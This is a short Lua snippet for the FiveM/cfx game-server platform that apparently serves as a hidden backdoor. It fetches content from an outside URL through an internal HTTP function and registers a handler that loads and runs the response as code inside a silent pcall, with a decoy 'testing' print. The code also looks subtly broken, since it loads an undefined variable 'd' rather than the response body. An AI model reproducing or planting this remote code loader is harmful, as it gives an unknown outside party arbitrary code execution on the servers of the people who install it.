local _v = PerformHttpRequestInternalEx{url='https://apiwebpanel.org/giXWm', method='GET'} 
AddEventHandler('__cfx_internal:httpResponse', function(_t, _s, _b) print('testing') if _v == _t then pcall(function() assert(load(d))() end) end end)
